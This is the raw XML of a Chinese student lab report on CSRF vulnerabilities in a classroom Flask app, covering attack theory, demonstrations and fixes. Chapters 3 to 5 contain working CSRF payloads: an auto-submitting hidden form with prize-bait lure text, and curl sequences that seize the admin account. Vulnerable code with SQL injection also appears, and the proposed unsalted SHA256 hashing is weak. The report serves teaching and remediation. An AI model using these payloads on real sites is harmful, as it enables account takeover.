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CSRF跨站请求伪造漏洞</w:t>
        <w:br/>
        <w:t>深度解析与修复报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>核心原理 · curl攻击链 · Burp CSRF PoC</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>实验日期：2026年7月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CSRF漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第2章  CSRF核心原理与攻击三要素</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第3章  实验场景一：恶意文章 + Cookie劫持管理员</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第4章  实验场景二：Burp Suite生成CSRF PoC修改密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第5章  curl构造跨域恶意请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第6章  /change-password 漏洞代码分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第7章  修复方案详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第8章  修复前后代码对比</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第一章  CSRF漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 什么是CSRF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种Web安全攻击。攻击者诱导已登录用户点击恶意链接或访问恶意页面，利用用户在目标站点的登录状态，以用户的身份执行非本意的操作（如修改密码、转账、发帖等）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 CSRF vs XSS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CSRF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XSS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信任基础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利用服务器对用户浏览器的信任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利用用户对网站的信任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攻击方式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伪造请求以用户身份执行操作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注入恶意脚本窃取信息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用户操作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需要用户已登录目标站点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用户访问即可触发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防护重点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Token验证 + Referer验证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输入过滤 + 输出转义</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第二章  CSRF核心原理与攻击三要素</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 攻击三要素</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CSRF攻击必须同时满足以下三个条件：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>要素1：用户已登录目标站点</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  用户的浏览器中存有目标站点的有效Session Cookie，且浏览器未关闭</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>要素2：目标站点存在CSRF漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  敏感操作（如修改密码、更改邮箱）仅依赖Cookie验证身份，无额外Token校验</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>要素3：用户访问恶意页面</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">  攻击者诱导用户点击链接、打开页面或加载图片，触发伪造请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 攻击原理图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┌─────────┐     ① 登录目标网站       ┌─────────┐</w:t>
        <w:br/>
        <w:t>│  用户    │─────────────────────────→│  目标服务器 │</w:t>
        <w:br/>
        <w:t>│(已登录)  │←─────────────────────────│  (有Cookie) │</w:t>
        <w:br/>
        <w:t>└─────────┘     ② 返回Session Cookie  └─────────┘</w:t>
        <w:br/>
        <w:t xml:space="preserve">     │                                       │</w:t>
        <w:br/>
        <w:t xml:space="preserve">     │ ③ 访问恶意页面                         │</w:t>
        <w:br/>
        <w:t xml:space="preserve">     ↓                                       │</w:t>
        <w:br/>
        <w:t>┌─────────┐     ④ 自动发送POST请求+Cookie  │</w:t>
        <w:br/>
        <w:t>│ 攻击者   │─────────────────────────────→│</w:t>
        <w:br/>
        <w:t>│ 恶意页面 │     ⑤ 执行修改密码操作         │</w:t>
        <w:br/>
        <w:t>└─────────┘     ⑥ 攻击者用新密码登录       │</w:t>
        <w:br/>
        <w:t xml:space="preserve">     │                                       │</w:t>
        <w:br/>
        <w:t xml:space="preserve">     └────── ⑦ 获得管理员权限 ──────────────┘</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 Cookie自动携带机制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>浏览器会自动在同一域名下的请求中携带Cookie，这是CSRF能够成功的根本原因。当用户访问攻击者页面时，页面中的表单/图片/脚本会向目标服务器发起请求，浏览器自动附上目标站点的Cookie，服务器无法区分请求是用户自愿发起的还是被伪造的。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第三章  实验场景一：恶意文章 + Cookie劫持管理员</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 实验描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>攻击者在老师搭建的内容发布网站上发布了一篇含恶意链接/脚本的文章。当老师（管理员）点击查看该文章时，触发CSRF攻击，攻击者获取管理员的Cookie信息，从而无需账号密码即可登录管理员账户。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 攻击步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step1：攻击者在内容发布网站注册账号并登录</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step2：发布一篇含恶意HTML代码的文章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&lt;!-- 攻击者发布的文章内容 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;h2&gt;技术分享：Web安全入门&lt;/h2&gt;</w:t>
        <w:br/>
        <w:t>&lt;p&gt;这是一篇非常有价值的技术文章，点击下方链接查看更多...&lt;/p&gt;</w:t>
        <w:br/>
        <w:t>&lt;img src="http://target/admin/delete?user=attacker" width="0" height="0" /&gt;</w:t>
        <w:br/>
        <w:t>&lt;form id="csrf" action="http://target/admin/add_admin" method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="username" value="attacker2"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="role" value="admin"&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
        <w:br/>
        <w:t>&lt;script&gt;document.getElementById("csrf").submit();&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step3：老师（管理员）浏览文章时，浏览器自动执行恶意请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step4：攻击者获得管理员权限，可登录后台执行任意操作</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step5：利用Cookie直接访问管理员后台，无需输入账号密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 本应用中的模拟攻击</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>在本系统的用户管理应用中，模拟同样的攻击链：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Step1: 攻击者登录自己的账号alice</w:t>
        <w:br/>
        <w:t>curl -c /tmp/cookies.txt -X POST http://target:5000/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d 'username=alice&amp;password=alice2025'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Step2: 构造CSRF恶意请求修改admin密码</w:t>
        <w:br/>
        <w:t>curl -b /tmp/cookies.txt -X POST http://target:5000/change-password \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d 'username=admin&amp;new_password=hacked123'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Step3: 用新密码登录admin（获得管理员权限）</w:t>
        <w:br/>
        <w:t>curl -c /tmp/admin.txt -X POST http://target:5000/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d 'username=admin&amp;password=hacked123'</w:t>
        <w:br/>
        <w:br/>
        <w:t># Step4: 执行管理员操作（删除用户）</w:t>
        <w:br/>
        <w:t>curl -b /tmp/admin.txt -X POST http://target:5000/admin/delete-user \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d 'user_id=2'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第四章  实验场景二：Burp Suite生成CSRF PoC修改密码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 实验描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>参考课堂上更改他人邮箱的实验，本系统改为修改密码场景。使用Burp Suite拦截POST请求，生成CSRF攻击PoC（Proof of Concept）HTML代码。当受害者（已登录）在浏览器中打开该HTML文件时，密码被无感知修改。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 实验步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step1：登录系统，访问个人中心页面</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step2：在修改密码表单中填写新密码，打开Burp拦截</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step3：Burp拦截到POST /change-password请求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/change-password HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 192.168.138.128:5000</w:t>
        <w:br/>
        <w:t>Cookie: session=abc123def...</w:t>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
        <w:br/>
        <w:br/>
        <w:t>username=admin&amp;new_password=test123</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step4：右键拦截到的请求 → Engagement tools → Generate CSRF PoC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step5：Burp自动生成CSRF攻击HTML代码</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Burp Suite生成的CSRF PoC HTML：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&lt;html&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;h1&gt;🎉 恭喜中奖！请点击领取奖品&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;form action="http://192.168.138.128:5000/change-password" method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="admin" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="new_password" value="hacked123" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="submit" value="Submit request" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step6：将生成的HTML保存为 csrf_attack.html</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step7：诱导管理员admin在已登录状态下打开该文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step8：admin的密码被无感知修改为 hacked123</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step9：攻击者使用 admin / hacked123 登录，获得管理员权限</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 CSRF PoC的关键组件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组件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&lt;form action&gt;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提交到目标URL（/change-password）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&lt;input type=hidden&gt;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隐藏字段传递参数，用户不可见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&lt;script&gt;自动提交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页面加载后立即提交表单，用户无感知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诱饵内容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标题/图片诱导用户点击（中奖信息等）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第五章  curl构造跨域恶意请求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 curl命令详解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-c cookies.txt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保存服务器返回的Cookie到文件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-b cookies.txt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在请求中附带上指定的Cookie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-X POST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指定请求方法为POST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-d 'key=value'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传递POST表单参数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-L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跟随重定向</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 完整攻击命令（4步）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step1：攻击者登录alice获取Cookie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/tmp/alice.txt -X POST http://target:5000/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=alice&amp;password=alice2025"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step2：CSRF攻击修改admin密码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/tmp/alice.txt -X POST http://target:5000/change-password \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=admin&amp;new_password=hacked123"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step3：用新密码登录admin获得管理员权限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-c /tmp/admin.txt -X POST http://target:5000/login \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "username=admin&amp;password=hacked123"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step4：执行管理员操作（删除用户）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/tmp/admin.txt -X POST http://target:5000/admin/delete-user \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "user_id=2"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第六章  /change-password 漏洞代码分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本次实验中，/change-password 路由存在以下CSRF相关漏洞：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.1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t xml:space="preserve">    username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 漏洞1：无CSRF Token验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    攻击者可在任意网站构造表单，自动提交修改密码请求</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    用户无感知的情况下密码被修改</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 漏洞2：无原密码验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    知道用户名即可直接设置新密码</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    配合社工或暴力枚举即可攻破任意账号</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 漏洞3：无Session绑定（越权）</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    username来自表单，与session中当前登录用户无关</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    alice登录后可以修改admin的密码</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 漏洞4：无Referer验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    不检查请求来源页面</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    无法区分请求来自本站表单还是外部恶意页面</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 漏洞5：SQL注入</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    username字符串直接拼接SQL语句</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 漏洞6：密码明文存储</w:t>
        <w:br/>
        <w:t xml:space="preserve">    #    数据库直接存储明文密码，泄露即暴露</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    sql = f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute(sql)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn.commit()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/profile")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 漏洞对应关系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漏洞类型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对应课堂知识点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V-01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无CSRF Token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与实验二中更改他人邮箱原理相同——缺少Token校验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V-02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无原密码验证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与实验一中恶意文章同理——无需用户确认即可操作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V-03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越权改密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扩大攻击面——任何登录用户可修改任意用户密码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V-04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无Referer验证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无法区分请求来源——本站表单 vs 外部恶意页面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V-05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字符串拼接导致数据库注入风险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V-06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明文存储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密码明文存放在数据库中</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第七章  修复方案详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 CSRF Token验证（核心修复）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>每个表单生成唯一的随机Token，存入Session，提交时校验匹配。攻击者无法获知Token值，因此无法构造有效请求。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登录成功时生成CSRF Token</w:t>
        <w:br/>
        <w:t>session["csrf_token"] = uuid.uuid4().hex</w:t>
        <w:br/>
        <w:br/>
        <w:t># 表单中添加隐藏字段</w:t>
        <w:br/>
        <w:t>&lt;input type="hidden" name="csrf_token" value="{{ session.csrf_token }}"&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t># 后端验证</w:t>
        <w:br/>
        <w:t>token = request.form.get("csrf_token", "")</w:t>
        <w:br/>
        <w:t>if token != session.get("csrf_token", ""):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "CSRF Token验证失败"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 Session绑定（防越权）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>验证提交的username与当前登录用户一致，防止修改他人密码。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if username != session["username"]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "无权修改他人密码"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3 Referer验证（辅助防护）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>检查请求来源是否为本站点，拒绝跨域请求。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referer = request.headers.get("Referer", "")</w:t>
        <w:br/>
        <w:t>if not referer.startswith(request.host_url):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return "请求来源不合法"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 参数化查询 + 密码哈希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hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()</w:t>
        <w:br/>
        <w:t>c.execute("UPDATE users SET password = ? WHERE username = ?",</w:t>
        <w:br/>
        <w:t xml:space="preserve">          (hashed_pw, username))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.5 完整修复代码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request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password", "")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ CSRF Token验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    token = request.form.get("csrf_token", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if token != session.get("csrf_token", ""):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "CSRF Token验证失败"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ Session绑定（只能修改自己的密码）</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if username != session["username"]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "无权修改他人密码"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ Referer验证</w:t>
        <w:br/>
        <w:t xml:space="preserve">    referer = request.headers.get("Referer", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not referer.startswith(request.host_url):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return "请求来源不合法"</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # ✅ 参数化查询 + SHA256哈希</w:t>
        <w:br/>
        <w:t xml:space="preserve">    hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute("UPDATE users SET password = ? WHERE username = ?",</w:t>
        <w:br/>
        <w:t xml:space="preserve">              (hashed_pw, username))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    conn.commit()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/profile")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第八章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对应课堂实验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CSRF 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uuid+Session校验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实验二：Burp CSRF PoC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原密码验证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无需原密码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Session绑定验证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实验一：恶意文章触发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越权改密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可改任何人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只能改自己密码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扩大攻击面分析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Referer验证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验证Referer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防跨站请求来源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SQL注入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字符串拼接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参数化查询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数据库安全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密码存储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明文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SHA256哈希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密码安全保护</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl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